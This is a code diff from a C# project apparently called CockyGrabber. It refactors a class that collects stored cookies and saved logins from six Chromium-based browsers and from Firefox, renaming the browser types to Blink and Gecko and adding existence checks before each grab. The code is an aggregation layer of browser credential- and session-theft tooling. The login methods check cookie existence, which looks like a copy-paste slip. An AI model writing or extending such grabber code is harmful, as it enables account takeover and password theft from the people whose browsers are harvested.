@@ -1,15 +1,5 @@
-﻿using CockyGrabber.Utility;
-using Org.BouncyCastle.Crypto;
-using Org.BouncyCastle.Crypto.Engines;
-using Org.BouncyCastle.Crypto.Modes;
-using Org.BouncyCastle.Crypto.Parameters;
-using System;
+﻿using System;
 using System.Collections.Generic;
-using System.IO;
-using System.Linq;
-using System.Security.Cryptography;
-using System.Text;
-using System.Web.Script.Serialization;
 
 namespace CockyGrabber.Grabbers
 {
@@ -47,83 +37,95 @@ namespace CockyGrabber.Grabbers
         }
 
         #region GetCookies()
-        public IEnumerable<Chromium.Cookie> GetAllChromiumCookiesBy(Chromium.CookieHeader by, object value)
+        public IEnumerable<Blink.Cookie> GetAllBlinkCookiesBy(Blink.CookieHeader by, object value)
         {
-            List<Chromium.Cookie> cookies = new List<Chromium.Cookie>();
+            List<Blink.Cookie> cookies = new List<Blink.Cookie>();
 
             // Add Cookies to list:
-            cookies.AddRange(CG.GetCookiesBy(by, value));
-            cookies.AddRange(BG.GetCookiesBy(by, value));
-            cookies.AddRange(VG.GetCookiesBy(by, value));
-            cookies.AddRange(OG.GetCookiesBy(by, value));
-            cookies.AddRange(OGG.GetCookiesBy(by, value));
-            cookies.AddRange(EG.GetCookiesBy(by, value));
+            if (CG.CookiesExist())
+                cookies.AddRange(CG.GetCookiesBy(by, value));
+            if (BG.CookiesExist())
+                cookies.AddRange(BG.GetCookiesBy(by, value));
+            if (VG.CookiesExist())
+                cookies.AddRange(VG.GetCookiesBy(by, value));
+            if (OG.CookiesExist())
+                cookies.AddRange(OG.GetCookiesBy(by, value));
+            if (OGG.CookiesExist())
+                cookies.AddRange(OGG.GetCookiesBy(by, value));
+            if (EG.CookiesExist())
+                cookies.AddRange(EG.GetCookiesBy(by, value));
+
+            return cookies;
+        }
+        public IEnumerable<Blink.Cookie> GetAllBlinkCookies()
+        {
+            List<Blink.Cookie> cookies = new List<Blink.Cookie>();
+
+            // Add Cookies to list:
+            if (CG.CookiesExist())
+                cookies.AddRange(CG.GetCookies());
+            if (BG.CookiesExist())
+                cookies.AddRange(BG.GetCookies());
+            if (VG.CookiesExist())
+                cookies.AddRange(VG.GetCookies());
+            if (OG.CookiesExist())
+                cookies.AddRange(OG.GetCookies());
+            if (OGG.CookiesExist())
+                cookies.AddRange(OGG.GetCookies());
+            if (EG.CookiesExist())
+                cookies.AddRange(EG.GetCookies());
 
             return cookies;
         }
 
-        public IEnumerable<Chromium.Cookie> GetAllChromiumCookies()
-        {
-            List<Chromium.Cookie> cookies = new List<Chromium.Cookie>();
-
-            // Add Cookies to list:
-            cookies.AddRange(CG.GetCookies());
-            cookies.AddRange(BG.GetCookies());
-            cookies.AddRange(VG.GetCookies());
-            cookies.AddRange(OG.GetCookies());
-            cookies.AddRange(OGG.GetCookies());
-            cookies.AddRange(EG.GetCookies());
-
-            return cookies;
-        }
-
-        public Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>> GetAllCookiesByChromium(Chromium.CookieHeader by, object value)
-            => new Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>>(GetAllChromiumCookiesBy(by, value), FG.GetCookies());
-        public Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>> GetAllCookiesByFirefox(Firefox.CookieHeader by, object value)
-            => new Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>>(GetAllChromiumCookies(), FG.GetCookiesBy(by, value));
-
-        public Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>> GetAllCookies()
-            => new Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>>(GetAllChromiumCookies(), FG.GetCookies());
+        public Tuple<IEnumerable<Blink.Cookie>, IEnumerable<Gecko.Cookie>> GetAllCookies()
+            => new Tuple<IEnumerable<Blink.Cookie>, IEnumerable<Gecko.Cookie>>(GetAllBlinkCookies(), FG.GetCookies());
         #endregion
 
         #region GetLogins()
-        public IEnumerable<Chromium.Login> GetAllChromiumLoginsBy(Chromium.LoginHeader by, object value)
+        public IEnumerable<Blink.Login> GetAllBlinkLoginsBy(Blink.LoginHeader by, object value)
         {
-            List<Chromium.Login> logins = new List<Chromium.Login>();
+            List<Blink.Login> logins = new List<Blink.Login>();
 
             // Add Logins to list:
-            logins.AddRange(CG.GetLoginsBy(by, value));
-            logins.AddRange(BG.GetLoginsBy(by, value));
-            logins.AddRange(VG.GetLoginsBy(by, value));
-            logins.AddRange(OG.GetLoginsBy(by, value));
-            logins.AddRange(OGG.GetLoginsBy(by, value));
-            logins.AddRange(EG.GetLoginsBy(by, value));
+            if (CG.CookiesExist())
+                logins.AddRange(CG.GetLoginsBy(by, value));
+            if (BG.CookiesExist())
+                logins.AddRange(BG.GetLoginsBy(by, value));
+            if (VG.CookiesExist())
+                logins.AddRange(VG.GetLoginsBy(by, value));
+            if (OG.CookiesExist())
+                logins.AddRange(OG.GetLoginsBy(by, value));
+            if (OGG.CookiesExist())
+                logins.AddRange(OGG.GetLoginsBy(by, value));
+            if (EG.CookiesExist())
+                logins.AddRange(EG.GetLoginsBy(by, value));
+
+            return logins;
+        }
+        public IEnumerable<Blink.Login> GetAllBlinkLogins()
+        {
+            List<Blink.Login> logins = new List<Blink.Login>();
+
+            // Add Logins to list:
+            if (CG.CookiesExist())
+                logins.AddRange(CG.GetLogins());
+            if (BG.CookiesExist())
+                logins.AddRange(BG.GetLogins());
+            if (VG.CookiesExist())
+                logins.AddRange(VG.GetLogins());
+            if (OG.CookiesExist())
+                logins.AddRange(OG.GetLogins());
+            if (OGG.CookiesExist())
+                logins.AddRange(OGG.GetLogins());
+            if (EG.CookiesExist())
+                logins.AddRange(EG.GetLogins());
 
             return logins;
         }
 
-        public IEnumerable<Chromium.Login> GetAllChromiumLogins()
-        {
-            List<Chromium.Login> logins = new List<Chromium.Login>();
-
-            // Add Logins to list:
-            logins.AddRange(CG.GetLogins());
-            logins.AddRange(BG.GetLogins());
-            logins.AddRange(VG.GetLogins());
-            logins.AddRange(OG.GetLogins());
-            logins.AddRange(OGG.GetLogins());
-            logins.AddRange(EG.GetLogins());
-
-            return logins;
-        }
-
-        public Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>> GetAllLoginsByChromium(Chromium.LoginHeader by, object value)
-            => new Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>>(GetAllChromiumLoginsBy(by, value), FG.GetLogins());
-        public Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>> GetAllLoginsByFirefox(Firefox.LoginHeader by, object value)
-            => new Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>>(GetAllChromiumLogins(), FG.GetLoginsBy(by, value));
-
-        public Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>> GetAllLogins()
-            => new Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>>(GetAllChromiumLogins(), FG.GetLogins());
+        public Tuple<IEnumerable<Blink.Login>, IEnumerable<Gecko.Login>> GetAllLogins()
+            => new Tuple<IEnumerable<Blink.Login>, IEnumerable<Gecko.Login>>(GetAllBlinkLogins(), FG.GetLogins());
         #endregion
     }
 }
